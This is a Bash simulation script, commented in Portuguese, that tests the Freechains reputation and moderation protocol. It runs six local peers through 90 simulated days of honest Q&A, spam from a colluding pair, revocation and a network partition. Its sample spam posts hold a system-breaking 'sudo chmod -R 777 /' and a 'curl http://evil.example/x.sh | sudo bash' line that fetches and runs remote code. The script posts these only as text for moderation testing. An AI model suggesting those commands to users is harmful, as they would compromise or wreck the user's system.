#!/usr/bin/env bash

set -u

command -v lua5.4 >/dev/null || { mkdir -p "$PWD/.sim-tmp/bin"; ln -sf "$(command -v lua)" "$PWD/.sim-tmp/bin/lua5.4" \
  && export PATH="$PWD/.sim-tmp/bin:$PATH" || { echo "ERRO: falta Lua 5.4"; exit 1; }; }
pkill -f -- '--port=83(3[012]|4[0-3])' 2>/dev/null
trap "pkill -f -- '--port=83(3[012]|4[0-3])' 2>/dev/null" EXIT

# variáveis
SIM=$PWD/sim-data; K=$SIM/keys; C='#stackoverflow'
D=86400; NOW=$(date +%s)       
MAR="freechains --root=$SIM/marina/";  RAF="freechains --root=$SIM/rafael/"
JUL="freechains --root=$SIM/juliana/"; THI="freechains --root=$SIM/thiago/"
REN="freechains --root=$SIM/renan/";   GUS="freechains --root=$SIM/gustavo/"
HUB="freechains --root=$SIM/hub/"
SPAM1='COMPRE SEGUIDORES: http://promo.example !!!'
SPAM2='Simples: sudo chmod -R 777 / e o erro some.'
SPAM3='Rode: curl http://evil.example/x.sh | sudo bash'

# SETUP
rm -rf "$SIM"; mkdir -p "$K"; t=$NOW
echo "══ Setup: chaves, chain, clones e daemons ══"
ssh-keygen -q -t ed25519 -C '' -N '' -f $K/marina
ssh-keygen -q -t ed25519 -C '' -N '' -f $K/rafael
ssh-keygen -q -t ed25519 -C '' -N '' -f $K/juliana
ssh-keygen -q -t ed25519 -C '' -N '' -f $K/thiago
ssh-keygen -q -t ed25519 -C '' -N '' -f $K/renan
ssh-keygen -q -t ed25519 -C '' -N '' -f $K/gustavo

$MAR --now=$((t)) chains add "$C" init --pioneer=$K/marina
freechains --root=$SIM/marina/ daemon start --port=8330 >$SIM/d-marina.log 2>&1 &
sleep 5
$HUB --now=$((t)) chains add "$C" clone localhost
$RAF --now=$((t)) chains add "$C" clone localhost
$JUL --now=$((t)) chains add "$C" clone localhost
$THI --now=$((t)) chains add "$C" clone localhost
$REN --now=$((t)) chains add "$C" clone localhost
$GUS --now=$((t)) chains add "$C" clone localhost
freechains --root=$SIM/hub/     daemon start --hub --port=8331 >$SIM/d-hub.log     2>&1 &
freechains --root=$SIM/renan/   daemon start --port=8332 >$SIM/d-renan.log   2>&1 &
freechains --root=$SIM/rafael/  daemon start --port=8340 >$SIM/d-rafael.log  2>&1 &
freechains --root=$SIM/juliana/ daemon start --port=8341 >$SIM/d-juliana.log 2>&1 &
freechains --root=$SIM/thiago/  daemon start --port=8342 >$SIM/d-thiago.log  2>&1 &
freechains --root=$SIM/gustavo/ daemon start --port=8343 >$SIM/d-gustavo.log 2>&1 &
sleep 5

# DIA 0
t=$NOW
echo; echo "══ Dia 0: marina posta as regras e acolhe rafael e juliana (like author) ══"
t=$((t+10)); RULES=$($MAR --now=$t chain "$C" post inline $'[Regras] Perguntas claras, sem spam. Respostas boas ganham likes.\n' --sign=$K/marina)
echo "[ POSTAGEM ] marina [${RULES:0:7}] [Regras] Perguntas claras, sem spam. Respostas boas ganham likes."
$MAR --now=$((t)) chain "$C" like 10000 author $K/rafael.pub  --sign=$K/marina
$MAR --now=$((t)) chain "$C" like 12000 author $K/juliana.pub --sign=$K/marina
$HUB --now=$((t)) chain "$C" sync recv localhost:8330        # publicar marina
$RAF --now=$((t)) chain "$C" sync recv localhost:8331
$JUL --now=$((t)) chain "$C" sync recv localhost:8331
$THI --now=$((t)) chain "$C" sync recv localhost:8331
$REN --now=$((t)) chain "$C" sync recv localhost:8331
$GUS --now=$((t)) chain "$C" sync recv localhost:8331
echo "reps marina=$($RAF --now=$t chain "$C" reps author $K/marina.pub)  rafael=$($RAF --now=$t chain "$C" reps author $K/rafael.pub)  juliana=$($RAF --now=$t chain "$C" reps author $K/juliana.pub)"
$RAF --now=$t chain "$C" get payload  $RULES
$RAF --now=$t chain "$C" get metadata $RULES
$RAF --now=$t chain "$C" list dag

# DIA 1
t=$((NOW+1*D))
echo; echo "══ Dia 1: thiago pede entrada (--beg) e marina aceita; spam do gustavo fica pendente ══"
t=$((t+10)); Q1=$($THI --now=$t chain "$C" post inline $'[Q#1] Como inverter uma lista em Python?\n' --beg --sign=$K/thiago)
echo "[ POSTAGEM ] thiago [${Q1:0:7}] [Q#1] Como inverter uma lista em Python?"
$HUB --now=$((t)) chain "$C" sync recv localhost:8342        # publicar thiago
$MAR --now=$((t)) chain "$C" sync recv localhost:8331
$MAR --now=$t chain "$C" list begs
$MAR --now=$((t)) chain "$C" like 4000 action $Q1 --sign=$K/marina
$HUB --now=$((t)) chain "$C" sync recv localhost:8330        # publicar marina
$THI --now=$((t)) chain "$C" sync recv localhost:8331
t=$((t+10)); $GUS --now=$t chain "$C" post inline "[A] $SPAM1"$'\n' --beg --sign=$K/gustavo
$HUB --now=$((t)) chain "$C" sync recv localhost:8343        # publicar gustavo
echo "begs pendentes no hub (spam do gustavo continua na fila):"; $HUB --now=$t chain "$C" list begs

# DIA 2
t=$((NOW+2*D))
echo; echo "══ Dia 2: gustavo (0 reps) tenta postar SEM --beg → deve ser bloqueado ══"
$GUS --now=$((t)) chain "$C" post inline $'spam sem reputacao\n' --sign=$K/gustavo

# DIAS 3-4
t=$((NOW+3*D))
echo; echo "══ Dia 3: rafael responde Q1; juliana pergunta Q2 ══"
$RAF --now=$((t)) chain "$C" sync recv localhost:8331
t=$((t+10)); A1=$($RAF --now=$t chain "$C" post inline "[A→${Q1:0:7}] Use lista.reverse() ou reversed(lista)."$'\n' --sign=$K/rafael)
echo "[ POSTAGEM ] rafael [${A1:0:7}] [A→${Q1:0:7}] Use lista.reverse() ou reversed(lista)."
$JUL --now=$((t)) chain "$C" sync recv localhost:8331
t=$((t+10)); Q2=$($JUL --now=$t chain "$C" post inline $'[Q#2] Diferenca entre == e === em JavaScript?\n' --sign=$K/juliana)
echo "[ POSTAGEM ] juliana [${Q2:0:7}] [Q#2] Diferenca entre == e === em JavaScript?"
$HUB --now=$((t)) chain "$C" sync recv localhost:8340
$HUB --now=$((t)) chain "$C" sync recv localhost:8341

t=$((NOW+4*D))
echo; echo "══ Dia 4: thiago dá like na resposta do rafael; marina responde Q2 ══"
$THI --now=$((t)) chain "$C" sync recv localhost:8331
$THI --now=$((t)) chain "$C" like 500 action $A1 --sign=$K/thiago
$MAR --now=$((t)) chain "$C" sync recv localhost:8331
t=$((t+10)); A2=$($MAR --now=$t chain "$C" post inline "[A→${Q2:0:7}] == coage tipos; === compara valor e tipo."$'\n' --sign=$K/marina)
echo "[ POSTAGEM ] marina [${A2:0:7}] [A→${Q2:0:7}] == coage tipos; === compara valor e tipo."
$HUB --now=$((t)) chain "$C" sync recv localhost:8342
$HUB --now=$((t)) chain "$C" sync recv localhost:8330

# DIAS 5-8
t=$((NOW+5*D))
echo; echo "══ Dia 5: renan entra com resposta copiada (--beg); juliana curte 8000 ══"
$REN --now=$((t)) chain "$C" sync recv localhost:8331
t=$((t+10)); BR=$($REN --now=$t chain "$C" post inline "[A→${Q1:0:7}] Use lista.reverse() ou reversed(lista)."$'\n' --beg --sign=$K/renan)
echo "[ POSTAGEM ] renan [${BR:0:7}] [A→${Q1:0:7}] Use lista.reverse() ou reversed(lista)."
$HUB --now=$((t)) chain "$C" sync recv localhost:8332
$JUL --now=$((t)) chain "$C" sync recv localhost:8331
$JUL --now=$((t)) chain "$C" like 8000 action $BR --sign=$K/juliana
$HUB --now=$((t)) chain "$C" sync recv localhost:8341
$REN --now=$((t)) chain "$C" sync recv localhost:8331

t=$((NOW+6*D))
echo; echo "══ Dia 6: rafael (ingênuo) dá like na resposta do renan ══"
$RAF --now=$((t)) chain "$C" sync recv localhost:8331
$RAF --now=$((t)) chain "$C" like 500 action $BR --sign=$K/rafael
$HUB --now=$((t)) chain "$C" sync recv localhost:8340

t=$((NOW+7*D))
echo; echo "══ Dia 8: renan financia gustavo (like author 3000; 10% de taxa → ele recebe 2700) ══"
$REN --now=$((t)) chain "$C" sync recv localhost:8331
$REN --now=$((t)) chain "$C" like 3000 author $K/gustavo.pub --sign=$K/renan
$HUB --now=$((t)) chain "$C" sync recv localhost:8332
$GUS --now=$((t)) chain "$C" sync recv localhost:8331

# DIAS 10-24
t=$((NOW+10*D))
echo; echo "══ Dia 10: o conluio finge ser honesto: respostas boas e likes cruzados ══"
$REN --now=$((t)) chain "$C" sync recv localhost:8331
t=$((t+10)); R2=$($REN --now=$t chain "$C" post inline "[A→${Q2:0:7}] == coage tipos; === compara valor e tipo. Prefira ==="$'\n' --sign=$K/renan)
echo "[ POSTAGEM ] renan [${R2:0:7}] [A→${Q2:0:7}] == coage tipos; === compara valor e tipo. Prefira ==="
$HUB --now=$((t)) chain "$C" sync recv localhost:8332
$GUS --now=$((t)) chain "$C" sync recv localhost:8331
$GUS --now=$((t)) chain "$C" like 500 action $R2 --sign=$K/gustavo
$GUS --now=$((t)) chain "$C" like 500 action $BR --sign=$K/gustavo
$HUB --now=$((t)) chain "$C" sync recv localhost:8343

t=$((NOW+14*D))
echo; echo "══ Dia 14: snapshot de reputação (visão do hub) ══"
echo "marina=$($HUB --now=$t chain "$C" reps author $K/marina.pub) rafael=$($HUB --now=$t chain "$C" reps author $K/rafael.pub) juliana=$($HUB --now=$t chain "$C" reps author $K/juliana.pub) thiago=$($HUB --now=$t chain "$C" reps author $K/thiago.pub) renan=$($HUB --now=$t chain "$C" reps author $K/renan.pub) gustavo=$($HUB --now=$t chain "$C" reps author $K/gustavo.pub)"

t=$((NOW+20*D))
echo; echo "══ Dia 20: thiago pergunta Q3; rafael responde ══"
$THI --now=$((t)) chain "$C" sync recv localhost:8331
t=$((t+10)); Q3=$($THI --now=$t chain "$C" post inline $'[Q#3] Como desfazer o ultimo commit no git?\n' --sign=$K/thiago)
echo "[ POSTAGEM ] thiago [${Q3:0:7}] [Q#3] Como desfazer o ultimo commit no git?"
$HUB --now=$((t)) chain "$C" sync recv localhost:8342
$RAF --now=$((t)) chain "$C" sync recv localhost:8331
t=$((t+10)); A3=$($RAF --now=$t chain "$C" post inline "[A→${Q3:0:7}] git reset --soft HEAD~1 mantem as alteracoes."$'\n' --sign=$K/rafael)
echo "[ POSTAGEM ] rafael [${A3:0:7}] [A→${Q3:0:7}] git reset --soft HEAD~1 mantem as alteracoes."
$HUB --now=$((t)) chain "$C" sync recv localhost:8340

# DIAS 25-27
t=$((NOW+25*D))
echo; echo "══ Dia 25: o conluio ataca: spam nas respostas (gustavo tenta direto e cai para --beg) ══"
$REN --now=$((t)) chain "$C" sync recv localhost:8331
t=$((t+10)); S1=$($REN --now=$t chain "$C" post inline "[A→${Q3:0:7}] $SPAM2"$'\n' --sign=$K/renan)
echo "[ POSTAGEM ] renan [${S1:0:7}] [A→${Q3:0:7}] $SPAM2"
$GUS --now=$((t)) chain "$C" sync recv localhost:8331
t=$((t+10)); S2=$($GUS --now=$t chain "$C" post inline "[A→${Q3:0:7}] $SPAM3"$'\n' --sign=$K/gustavo) \
  || $GUS --now=$((t)) chain "$C" post inline "[A] $SPAM1"$'\n' --beg --sign=$K/gustavo
echo "[ POSTAGEM ] gustavo [${S2:0:7}] [A→${Q3:0:7}] $SPAM3"
$HUB --now=$((t)) chain "$C" sync recv localhost:8332
$HUB --now=$((t)) chain "$C" sync recv localhost:8343

t=$((NOW+26*D))
echo; echo "══ Dia 26: marina modera: lê, dá dislike e revoga o spam; confere que o payload sumiu ══"
$MAR --now=$((t)) chain "$C" sync recv localhost:8331
$MAR --now=$((t)) chain "$C" get payload $S1
$MAR --now=$((t)) chain "$C" dislike 1000 action $S1 --sign=$K/marina
$MAR --now=$((t)) chain "$C" revoke  1000 $S1 --sign=$K/marina
$MAR --now=$((t)) chain "$C" get payload $S1 \
  || echo " payload oculto (revoked) — moderação confirmada"
[[ -n $S2 ]] && $MAR --now=$((t)) chain "$C" get payload $S2
[[ -n $S2 ]] && $MAR --now=$((t)) chain "$C" dislike 1000 action $S2 --sign=$K/marina
[[ -n $S2 ]] && $MAR --now=$((t)) chain "$C" revoke  1000 $S2 --sign=$K/marina
$HUB --now=$((t)) chain "$C" sync recv localhost:8330

t=$((NOW+27*D))
echo; echo "══ Dia 27: brigada: o conluio dá dislike em respostas boas dos honestos ══"
$REN --now=$((t)) chain "$C" sync recv localhost:8331
$REN --now=$((t)) chain "$C" dislike 500 action $A3 --sign=$K/renan
$GUS --now=$((t)) chain "$C" sync recv localhost:8331
$GUS --now=$((t)) chain "$C" dislike 500 action $A2 --sign=$K/gustavo
$HUB --now=$((t)) chain "$C" sync recv localhost:8332
$HUB --now=$((t)) chain "$C" sync recv localhost:8343

# DIA 28
t=$((NOW+28*D))
echo; echo "══ Dia 28: fork de consenso: rafael e juliana postam em paralelo, sem sincronizar ══"
$RAF --now=$((t)) chain "$C" sync recv localhost:8331
$JUL --now=$((t)) chain "$C" sync recv localhost:8331
t=$((t+10)); A4=$($RAF --now=$t chain "$C" post inline "[A→${Q2:0:7}] Prefira sempre === para evitar coercao."$'\n' --sign=$K/rafael)
echo "[ POSTAGEM ] rafael [${A4:0:7}] [A→${Q2:0:7}] Prefira sempre === para evitar coercao."
t=$((t+10)); A5=$($JUL --now=$t chain "$C" post inline "[A→${Q3:0:7}] Tambem funciona: git reset --mixed HEAD~1."$'\n' --sign=$K/juliana)
echo "[ POSTAGEM ] juliana [${A5:0:7}] [A→${Q3:0:7}] Tambem funciona: git reset --mixed HEAD~1."
$HUB --now=$((t)) chain "$C" sync recv localhost:8340
$HUB --now=$((t)) chain "$C" sync recv localhost:8341
echo "DAG do hub (com o fork):"; $HUB --now=$t chain "$C" list dag | tail -8
echo "ordem de consenso (reps decidem quem vem primeiro):"; $HUB --now=$t chain "$C" list order | tail -4
$RAF --now=$((t)) chain "$C" sync recv localhost:8331
$JUL --now=$((t)) chain "$C" sync recv localhost:8331

# DIA 30
t=$((NOW+30*D))
echo; echo "══ Dia 30: sweep (apaga payloads revogados) em todos os peers ══"
$HUB --now=$((t)) chain "$C" sweep
$MAR --now=$((t)) chain "$C" sweep
$RAF --now=$((t)) chain "$C" sweep
$JUL --now=$((t)) chain "$C" sweep
$THI --now=$((t)) chain "$C" sweep
$REN --now=$((t)) chain "$C" sweep
$GUS --now=$((t)) chain "$C" sweep

# DIAS 33-36
t=$((NOW+33*D))
echo; echo "══ Dia 33: abuso: renan revoga a resposta boa do rafael (A1) ══"
$REN --now=$((t)) chain "$C" sync recv localhost:8331
$REN --now=$((t)) chain "$C" revoke 1000 $A1 --sign=$K/renan
$REN --now=$((t)) chain "$C" get payload $A1 \
  || echo " payload oculto (revoked) — abuso confirmado"
$HUB --now=$((t)) chain "$C" sync recv localhost:8332

t=$((NOW+34*D))
echo; echo "══ Dia 34: marina desfaz a revogação indevida (unrevoke) ══"
$MAR --now=$((t)) chain "$C" sync recv localhost:8331
$MAR --now=$((t)) chain "$C" unrevoke 3000 $A1 --sign=$K/marina
$MAR --now=$((t)) chain "$C" get payload $A1
$HUB --now=$((t)) chain "$C" sync recv localhost:8330

t=$((NOW+36*D))
echo; echo "══ Dia 36: direito de ser esquecido: juliana vaza uma chave e revoga o próprio post (grátis) ══"
$JUL --now=$((t)) chain "$C" sync recv localhost:8331
t=$((t+10)); LEAK=$($JUL --now=$t chain "$C" post inline $'[A] export API_KEY=sk-live-123 (oops)\n' --sign=$K/juliana)
echo "[ POSTAGEM ] juliana [${LEAK:0:7}] [A] export API_KEY=sk-live-123 (oops)"
$JUL --now=$((t)) chain "$C" revoke 1000 $LEAK --sign=$K/juliana
$JUL --now=$((t)) chain "$C" get payload $LEAK \
  || echo " payload oculto (revoked) — direito ao esquecimento confirmado"
$HUB --now=$((t)) chain "$C" sync recv localhost:8341

# DIA 38-39
t=$((NOW+38*D))
echo; echo "══ Dia 38: mais spam do conluio ══"
$REN --now=$((t)) chain "$C" sync recv localhost:8331
t=$((t+10)); S3=$($REN --now=$t chain "$C" post inline "[A→${Q2:0:7}] $SPAM1"$'\n' --sign=$K/renan)
echo "[ POSTAGEM ] renan [${S3:0:7}] [A→${Q2:0:7}] $SPAM1"
$GUS --now=$((t)) chain "$C" sync recv localhost:8331
t=$((t+10)); S4=$($GUS --now=$t chain "$C" post inline "[A→${Q2:0:7}] $SPAM2"$'\n' --sign=$K/gustavo) \
  || $GUS --now=$((t)) chain "$C" post inline "[A] $SPAM3"$'\n' --beg --sign=$K/gustavo
echo "[ POSTAGEM ] gustavo [${S4:0:7}] [A→${Q2:0:7}] $SPAM2"
$HUB --now=$((t)) chain "$C" sync recv localhost:8332
$HUB --now=$((t)) chain "$C" sync recv localhost:8343

t=$((NOW+39*D))
echo; echo "══ Dia 39: rafael modera em lote (3ª reincidência do renan → dislike no autor) ══"
$RAF --now=$((t)) chain "$C" sync recv localhost:8331
$RAF --now=$((t)) chain "$C" dislike 1000 action $S3 --sign=$K/rafael
$RAF --now=$((t)) chain "$C" revoke  1000 $S3 --sign=$K/rafael
[[ -n $S4 ]] && $RAF --now=$((t)) chain "$C" dislike 1000 action $S4 --sign=$K/rafael
[[ -n $S4 ]] && $RAF --now=$((t)) chain "$C" revoke  1000 $S4 --sign=$K/rafael
$RAF --now=$((t)) chain "$C" dislike 500 author $K/renan.pub --sign=$K/rafael
$HUB --now=$((t)) chain "$C" sync recv localhost:8340

# DIAS 40-47
t=$((NOW+40*D))
echo; echo "══ Dia 40: partição: renan e gustavo ficam isolados do hub e só sincronizam entre si (:8332) ══"
$REN --now=$((t)) chain "$C" sync recv localhost:8331
$GUS --now=$((t)) chain "$C" sync recv localhost:8331

t=$((NOW+41*D))
echo; echo "══ Dia 41: dentro da célula: spam e likes cruzados, sem passar pelo hub ══"
t=$((t+10)); S5=$($REN --now=$t chain "$C" post inline "[A→${Q1:0:7}] $SPAM3"$'\n' --sign=$K/renan)
echo "[ POSTAGEM ] renan [${S5:0:7}] [A→${Q1:0:7}] $SPAM3"
$GUS --now=$((t)) chain "$C" sync recv localhost:8332 
[[ -n $S5 ]] && $GUS --now=$((t)) chain "$C" like 500 action $S5 --sign=$K/gustavo
t=$((t+10)); S6=$($GUS --now=$t chain "$C" post inline "[A→${Q1:0:7}] $SPAM1"$'\n' --sign=$K/gustavo)
echo "[ POSTAGEM ] gustavo [${S6:0:7}] [A→${Q1:0:7}] $SPAM1"
$REN --now=$((t)) chain "$C" sync recv localhost:8343 

t=$((NOW+43*D))
echo; echo "══ Dia 43: enquanto isso, a comunidade honesta segue no hub ══"
$THI --now=$((t)) chain "$C" sync recv localhost:8331
t=$((t+10)); Q4=$($THI --now=$t chain "$C" post inline $'[Q#4] Por que meu JOIN retorna linhas duplicadas?\n' --sign=$K/thiago)
echo "[ POSTAGEM ] thiago [${Q4:0:7}] [Q#4] Por que meu JOIN retorna linhas duplicadas?"
$HUB --now=$((t)) chain "$C" sync recv localhost:8342
$RAF --now=$((t)) chain "$C" sync recv localhost:8331
t=$((t+10)); A6=$($RAF --now=$t chain "$C" post inline "[A→${Q4:0:7}] Relacao 1:N: use DISTINCT ou GROUP BY."$'\n' --sign=$K/rafael)
echo "[ POSTAGEM ] rafael [${A6:0:7}] [A→${Q4:0:7}] Relacao 1:N: use DISTINCT ou GROUP BY."
$HUB --now=$((t)) chain "$C" sync recv localhost:8340

t=$((NOW+47*D))
echo; echo "══ Dia 47: fim da partição: o conluio reenvia seus ramos ao hub ══"
$HUB --now=$((t)) chain "$C" sync recv localhost:8332
$HUB --now=$((t)) chain "$C" sync recv localhost:8343
echo "ordem de consenso depois do merge (ramo honesto, com mais reps, deve vir antes):"
$HUB --now=$t chain "$C" list order | tail -8
$MAR --now=$((t)) chain "$C" sync recv localhost:8331
$RAF --now=$((t)) chain "$C" sync recv localhost:8331
$JUL --now=$((t)) chain "$C" sync recv localhost:8331
$THI --now=$((t)) chain "$C" sync recv localhost:8331
$REN --now=$((t)) chain "$C" sync recv localhost:8331
$GUS --now=$((t)) chain "$C" sync recv localhost:8331

t=$((NOW+48*D))
echo; echo "══ Dia 48: marina modera o spam que veio da célula ══"
$MAR --now=$((t)) chain "$C" sync recv localhost:8331
[[ -n $S5 ]] && $MAR --now=$((t)) chain "$C" dislike 1000 action $S5 --sign=$K/marina
[[ -n $S5 ]] && $MAR --now=$((t)) chain "$C" revoke  1000 $S5 --sign=$K/marina
[[ -n $S6 ]] && $MAR --now=$((t)) chain "$C" dislike 1000 action $S6 --sign=$K/marina
[[ -n $S6 ]] && $MAR --now=$((t)) chain "$C" revoke  1000 $S6 --sign=$K/marina
$HUB --now=$((t)) chain "$C" sync recv localhost:8330

# DIAS 55-66
t=$((NOW+55*D))
echo; echo "══ Dia 55: marina publica pela última vez e sai de férias (offline) ══"
$MAR --now=$((t)) chain "$C" sync recv localhost:8331
$HUB --now=$((t)) chain "$C" sync recv localhost:8330
TAWAY=$((t+3600)) 

t=$((NOW+58*D))
echo; echo "══ Dias 58-64: a chain continua sem a marina (honestos conversam, conluio faz spam, rafael modera) ══"
$RAF --now=$((t)) chain "$C" sync recv localhost:8331
t=$((t+10)); A7=$($RAF --now=$t chain "$C" post inline "[A→${Q4:0:7}] Confira se o JOIN usa a chave correta."$'\n' --sign=$K/rafael)
echo "[ POSTAGEM ] rafael [${A7:0:7}] [A→${Q4:0:7}] Confira se o JOIN usa a chave correta."
$HUB --now=$((t)) chain "$C" sync recv localhost:8340
$THI --now=$((t)) chain "$C" sync recv localhost:8331
$THI --now=$((t)) chain "$C" like 500 action $A7 --sign=$K/thiago
$HUB --now=$((t)) chain "$C" sync recv localhost:8342
t=$((NOW+61*D))
$REN --now=$((t)) chain "$C" sync recv localhost:8331
t=$((t+10)); S7=$($REN --now=$t chain "$C" post inline "[A→${Q4:0:7}] $SPAM2"$'\n' --sign=$K/renan)
echo "[ POSTAGEM ] renan [${S7:0:7}] [A→${Q4:0:7}] $SPAM2"
$HUB --now=$((t)) chain "$C" sync recv localhost:8332
t=$((NOW+63*D))
$RAF --now=$((t)) chain "$C" sync recv localhost:8331
[[ -n $S7 ]] && $RAF --now=$((t)) chain "$C" dislike 1000 action $S7 --sign=$K/rafael
[[ -n $S7 ]] && $RAF --now=$((t)) chain "$C" revoke  1000 $S7 --sign=$K/rafael
$HUB --now=$((t)) chain "$C" sync recv localhost:8340

t=$((NOW+66*D))
echo; echo "══ Dia 66 ══"
t=$((t+10)); HF=$($MAR --now=$TAWAY chain "$C" post inline $'[Mod] Voltei! Revisando a fila.\n' --sign=$K/marina)
echo "[ POSTAGEM ] marina [${HF:0:7}] [Mod] Voltei! Revisando a fila."
if $HUB --now=$((t)) chain "$C" sync recv localhost:8330; then
  echo " "
else
  echo " hard fork detectado"
fi
echo "recuperação: abandon → recv do hub → repostar → publicar"
$MAR --now=$((t)) chain "$C" abandon $HF
$MAR --now=$((t)) chain "$C" sync recv localhost:8331
$MAR --now=$((t)) chain "$C" post inline $'[Mod] Voltei! Revisando a fila. (repost)\n' --sign=$K/marina
$HUB --now=$((t)) chain "$C" sync recv localhost:8330
$HUB --now=$t chain "$C" list order | tail -3

# DIAS 70-72
t=$((NOW+70*D))
echo; echo "══ Dia 70: o conluio dá dislike 2000 na autora juliana ══"
$REN --now=$((t)) chain "$C" sync recv localhost:8331
$REN --now=$((t)) chain "$C" dislike 2000 author $K/juliana.pub --sign=$K/renan
$GUS --now=$((t)) chain "$C" sync recv localhost:8331
$GUS --now=$((t)) chain "$C" dislike 2000 author $K/juliana.pub --sign=$K/gustavo \
  || { echo "  (gustavo sem saldo p/ 2000 — spam revogado empobrece o atacante; dislike de 500)"; \
       $GUS --now=$((t)) chain "$C" dislike 500 author $K/juliana.pub --sign=$K/gustavo; }
$HUB --now=$((t)) chain "$C" sync recv localhost:8332
$HUB --now=$((t)) chain "$C" sync recv localhost:8343

t=$((NOW+72*D))
echo; echo "══ Dia 72: a comunidade reage: marina e rafael dão dislike 3000 no renan ══"
$MAR --now=$((t)) chain "$C" sync recv localhost:8331
$MAR --now=$((t)) chain "$C" dislike 3000 author $K/renan.pub --sign=$K/marina
$RAF --now=$((t)) chain "$C" sync recv localhost:8331
$RAF --now=$((t)) chain "$C" dislike 3000 author $K/renan.pub --sign=$K/rafael
$HUB --now=$((t)) chain "$C" sync recv localhost:8330
$HUB --now=$((t)) chain "$C" sync recv localhost:8340

# DIA 90
t=$((NOW+90*D))
echo; echo "══ Dia 90: sincronização geral, sweep e relatório final ══"
$HUB --now=$((t)) chain "$C" sync recv localhost:8330
$HUB --now=$((t)) chain "$C" sync recv localhost:8340
$HUB --now=$((t)) chain "$C" sync recv localhost:8341
$HUB --now=$((t)) chain "$C" sync recv localhost:8342
$HUB --now=$((t)) chain "$C" sync recv localhost:8332
$HUB --now=$((t)) chain "$C" sync recv localhost:8343
$MAR --now=$((t)) chain "$C" sync recv localhost:8331
$RAF --now=$((t)) chain "$C" sync recv localhost:8331
$JUL --now=$((t)) chain "$C" sync recv localhost:8331
$THI --now=$((t)) chain "$C" sync recv localhost:8331
$REN --now=$((t)) chain "$C" sync recv localhost:8331
$GUS --now=$((t)) chain "$C" sync recv localhost:8331
$HUB --now=$((t)) chain "$C" sweep
$MAR --now=$((t)) chain "$C" sweep
$RAF --now=$((t)) chain "$C" sweep
$JUL --now=$((t)) chain "$C" sweep
$THI --now=$((t)) chain "$C" sweep
$REN --now=$((t)) chain "$C" sweep
$GUS --now=$((t)) chain "$C" sweep

echo; echo "── Reputação final (hub): honestos × maliciosos ──"
echo "honesto    marina  = $($HUB --now=$t chain "$C" reps author $K/marina.pub)"
echo "honesto    rafael  = $($HUB --now=$t chain "$C" reps author $K/rafael.pub)"
echo "honesto    juliana = $($HUB --now=$t chain "$C" reps author $K/juliana.pub)"
echo "honesto    thiago  = $($HUB --now=$t chain "$C" reps author $K/thiago.pub)"
echo "MALICIOSO  renan   = $($HUB --now=$t chain "$C" reps author $K/renan.pub)"
echo "MALICIOSO  gustavo = $($HUB --now=$t chain "$C" reps author $K/gustavo.pub)"
echo; echo "── reps authors ──";  $HUB --now=$t chain "$C" reps authors
echo; echo "── reps actions ──";  $HUB --now=$t chain "$C" reps actions | sort -k2,2nr | head -5
echo "..."; $HUB --now=$t chain "$C" reps actions | sort -k2,2nr | tail -5
echo; echo "── begs pendentes no hub (spam sem like nunca entra na chain) ──"; $HUB --now=$t chain "$C" list begs
echo; echo "── Consenso: o hash da 'list order' deve ser igual em todos os peers ──"
echo "hub     $($HUB --now=$t chain "$C" list order | md5sum | cut -c1-12)"
echo "marina  $($MAR --now=$t chain "$C" list order | md5sum | cut -c1-12)"
echo "rafael  $($RAF --now=$t chain "$C" list order | md5sum | cut -c1-12)"
echo "juliana $($JUL --now=$t chain "$C" list order | md5sum | cut -c1-12)"
echo "thiago  $($THI --now=$t chain "$C" list order | md5sum | cut -c1-12)"
echo "renan   $($REN --now=$t chain "$C" list order | md5sum | cut -c1-12)"
echo "gustavo $($GUS --now=$t chain "$C" list order | md5sum | cut -c1-12)"
